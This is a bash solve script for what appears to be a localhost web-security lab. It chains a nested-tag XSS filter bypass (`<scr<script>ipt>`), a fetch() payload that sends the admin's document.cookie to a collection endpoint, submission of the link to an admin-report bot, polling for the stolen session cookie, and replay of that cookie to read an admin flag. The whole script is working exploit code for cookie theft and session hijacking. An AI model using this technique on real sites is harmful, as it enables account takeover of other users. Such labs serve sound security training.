#!/usr/bin/env bash
# Lab 20 — nest the tag so the filter's own edit produces the payload, then let
# the admin's browser hand you the cookie.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9200}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab20
ID="drop$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# `<scr<script>ipt>` — the filter deletes the inner `<script>` and glues the
# halves of the outer one back together.
PAYLOAD="<scr<script>ipt>fetch('/collect?id=$ID&c='+encodeURIComponent(document.cookie))</script>"

# Confirm the bypass survives the filter before spending the one report.
send "$SESSION" req_0 --create --set path=/search --set "query.q=$PAYLOAD" | body |
    grep -o "<script>" >/dev/null || { echo "filter not bypassed"; exit 1; }

TARGET="$URL/search?q=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD")"
send "$SESSION" req_0 --create --set path=/report --set "query.url=$TARGET" >/dev/null

for _ in $(seq 1 30); do
    COOKIE="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
        python3 -c 'import json,sys,urllib.parse
rows = json.load(sys.stdin)["rows"]
for row in rows:
    for part in urllib.parse.unquote(row).split(";"):
        if part.strip().startswith("session="):
            print(part.strip().split("=", 1)[1]); raise SystemExit
print("")')"
    [ -n "$COOKIE" ] && break
    sleep 1
done
[ -n "$COOKIE" ] || { echo "the admin never called back"; exit 1; }

send "$SESSION" req_0 --create --set path=/admin/flag --set "cookie.session=$COOKIE" | flag
